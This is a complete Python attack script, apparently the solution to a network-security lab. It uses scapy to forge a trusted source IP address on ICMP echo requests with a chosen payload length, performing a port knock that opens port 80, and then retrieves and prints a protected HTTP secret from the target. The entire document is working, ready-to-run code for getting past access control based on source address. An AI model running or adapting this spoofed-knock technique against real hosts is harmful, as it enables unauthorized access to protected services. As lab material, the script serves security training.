"""
The script sends two spoofed ICMP echo requests (type = 8) with the requested payload
length (22) to open port 80, then retrieves and prints the HTTP secret from the target (server).

Libraries used: scapy and requests (already present in the attacker container).
"""

import sys
import time
from ipaddress import ip_address
import requests
from scapy.all import ICMP, IP, Raw, send

HTTP_TIMEOUT_S = 5
HTTP_RETRIES = 10

def parse_args(argv: list[str]) -> tuple[str, str, int]:
    if len(argv) != 4:
        print("Usage: python3 spoof_ip.py <target_ip> <spoofed_source_ip> <payload_length>")
        print("Example: python3 spoof_ip.py 192.168.124.20 192.168.124.10 22")
        sys.exit(1)

    target_ip = argv[1]
    spoofed_source_ip = argv[2]

    try:
        ip_address(target_ip)
        ip_address(spoofed_source_ip)
    except ValueError as e:
        print(f"Invalid IP address: {e}")
        sys.exit(1)

    try:
        payload_length = int(argv[3])
    except ValueError as e:
        print(f"Invalid payload length, not an integer: {e}")
        sys.exit(1)
    if payload_length < 0:
        print(f"Payload length must not be negative: {payload_length}")
        sys.exit(1)

    return target_ip, spoofed_source_ip, payload_length

def send_spoofed_icmp_knocks(target_ip: str, spoofed_source_ip: str, payload_length: int):
    payload = b"A" * payload_length
    for sequence_number in range(1, 3):
        packet = (
            IP(src=spoofed_source_ip, dst=target_ip)
            / ICMP(type=8, id=0x1222, seq=sequence_number)
            / Raw(load=payload)
        )
        send(packet, verbose=False)
        time.sleep(0.3)
    return

def retrieve_secret(target_ip: str) -> str:
    last_error = None

    for _ in range(HTTP_RETRIES):
        try:
            response = requests.get(f"http://{target_ip}", timeout=HTTP_TIMEOUT_S)
            response.raise_for_status()
            return response.text.strip()
        except requests.RequestException as e:
            last_error = e
            time.sleep(0.3)

    print(f"Failed to retrieve secret: {last_error}")
    sys.exit(1)

def main():
    target_ip, spoofed_source_ip, spoofed_payload_length = parse_args(sys.argv)
    send_spoofed_icmp_knocks(target_ip, spoofed_source_ip, spoofed_payload_length)
    print(retrieve_secret(target_ip))

if __name__ == "__main__":
    main()
